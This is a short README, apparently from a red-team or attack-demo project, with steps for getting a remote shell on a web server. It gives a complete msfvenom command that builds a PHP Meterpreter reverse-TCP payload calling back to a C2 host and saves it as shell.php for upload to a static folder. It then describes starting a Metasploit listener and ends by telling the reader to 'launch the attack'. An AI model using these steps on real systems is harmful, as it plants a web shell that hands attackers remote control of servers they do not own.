# Generate shellcode and run MSF listener

- Get a Linux (Kali?) server with Metasploit installed - your C2 server
- Generate shell.php file and upload to the **static** folder as "shell.php". Generate on your Linux machine with:
`msfvenom -p php/meterpreter_reverse_tcp LHOST=c2-server.example.com LPORT=30000 -f raw > shell.php`

- Copy files in shellcode directory to your C2 server

- Run MSF listener on C2 server by running run-msf.sh, which in turn will use details in meterpreter.rc **Ensure you have updated this file with your C2 server IP**

- Ensure Metasploit has run and is listening, then you're good to launch the attack!